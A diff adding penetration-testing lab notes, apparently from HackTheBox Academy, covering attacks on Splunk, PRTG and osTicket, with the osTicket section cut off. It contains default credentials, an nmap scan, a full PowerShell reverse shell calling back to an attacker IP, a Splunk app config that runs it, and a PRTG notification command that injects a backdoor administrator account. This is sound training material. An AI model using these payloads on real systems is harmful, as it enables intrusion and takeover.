@@ -182,3 +182,141 @@ run
 
 >Flag : `cat /opt/tomcat/apache-tomcat-10.0.10/webapps/tomcat_flag.txt`.  
   
+## Splunk   
+
+>[Splunk SIEM - Discovery & Enumeration](https://academy.hackthebox.com/module/113/section/1092)  
+
+>Splunk, the default credentials are `admin`:`changeme`.  
+>Common weak passwords such as:
+```
+admin
+Welcome
+Welcome1
+Password123
+```  
+
+### Discovery & Enumeration  
+
+>Port scan with nmap splunk target:  
+
+```
+sudo nmap -p 80,135,139,445,3389,8000,8080,8089,5985,47001 -sCV -A -O 10.129.201.50 -oA splunk
+```  
+
+>NMAP Output below indicate Splunk version 8.2.2 running at URL `https://10.129.201.50:8000/en-US/app/launcher/home`  
+
+```
+PORT      STATE SERVICE       VERSION
+80/tcp    open  http          Microsoft IIS httpd 10.0
+|_http-title: IIS Windows Server
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: APP03
+|   NetBIOS_Domain_Name: APP03
+|   NetBIOS_Computer_Name: APP03
+|   DNS_Domain_Name: APP03
+|   DNS_Computer_Name: APP03
+|   Product_Version: 10.0.17763
+|_  System_Time: 2023-07-27T05:58:39+00:00
+|_ssl-date: 2023-07-27T05:59:18+00:00; +2s from scanner time.
+| ssl-cert: Subject: commonName=APP03
+| Not valid before: 2023-07-26T05:53:24
+|_Not valid after:  2024-01-25T05:53:24
+8000/tcp  open  ssl/http      Splunkd httpd
+| http-robots.txt: 1 disallowed entry 
+|_/
+|_http-server-header: Splunkd
+| ssl-cert: Subject: commonName=APP03/organizationName=SplunkUser
+| Not valid before: 2021-08-27T16:52:08
+|_Not valid after:  2024-08-26T16:52:08
+| http-title: Site doesn't have a title (text/html; charset=UTF-8).
+|_Requested resource was https://10.129.201.50:8000/en-US/account/login?return_to=%2Fen-US%2F
+8080/tcp  open  http          Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
+|_http-server-header: PRTG/18.1.37.13946
+|_http-trane-info: Problem with XML parsing of /evox/about
+| http-title: Welcome | PRTG Network Monitor (APP03)
+|_Requested resource was /index.htm
+|_http-open-proxy: Proxy might be redirecting requests
+8089/tcp  open  ssl/http      Splunkd httpd
+|_http-title: splunkd
+|_http-server-header: Splunkd
+| http-robots.txt: 1 disallowed entry 
+|_/
+```  
+
+### Splunk Attack  
+
+>Download payload from `https://github.com/0xjpuff/reverse_shell_splunk.git`
+
+>Modify the PowerShell reverse shell script:
+
+```PowerShell
+$client = New-Object System.Net.Sockets.TCPClient('10.10.14.216',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```  
+
+>inputs.conf configuration for Splunk App package:  
+```
+[script://./bin/rev.py]
+disabled = 0  
+interval = 10  
+sourcetype = pentest 
+
+[script://.\bin\run.bat]
+disabled = 0
+sourcetype = pentest
+interval = 10
+```
+
+>Create install app from file `.spl` file: `tar -cvzf updater.tar.gz reverse_shell_splunk`  
+
+>Start Netcat listener on Kali: `rlwrap nc -nvlp 443`  
+
+>On Splunk Web Appliation dashboard, `https://10.129.201.50:8000/en-US/manager/search/apps/local`, select option `Install app from file`.  
+
+![splunk attack-reverse-shell](/images/splunk-attack-reverse-shell.png)  
+
+>Looting, `get-content c:\loot\flag.txt`  
+
+## PRTG Network Monitor  
+
+>Default creds: `prtgadmin:prtgadmin` or `prtgadmin:Password123`
+
+>Enumerate Version with `curl -s http://10.129.201.50:8080/index.htm -A "Mozilla/5.0 (compatible;  MSIE 7.01; Windows NT 5.0)" | grep version`
+
+### PRTG Attack  
+
+>[Attack chain: PRTG - Setup - Account Settings menu - Notifications](https://academy.hackthebox.com/module/113/section/1094)  
+>Logged in as prtg admin, we create new notification and set to execute a program.
+>The program command to execute `test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add`, will create new local administrator user.
+
+![prtg-attack](/images/prtg-attack.png)  
+
+>Execution of the notivation clicking on the `Send Test notification`
+
+>Validate from Kali new administrator access: `sudo crackmapexec smb 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG!`
+
+>Flag:
+```
+cd c:\users\administrator\desktop
+get-content flag.txt
+```  
+
+## osTicket  
+
+>[Helpdesk software - powered by osTicket](https://academy.hackthebox.com/module/113/section/1214)  
+
+### Attack Kill Chain osTockit  
+
++ Footprint - Exploit wep app functions and work flow if no vulnerabilities found in research.  
++ Discovery - Open a new support ticket as `john@john.com` and obtain email address `950435@inlanefreight.local`, that match ticket id.
++ Enumeration - Check Ticket status and Login with `john@john.com` and the `950435` ticket number.  
++ OSINT - `
+
+
+
+
+
+
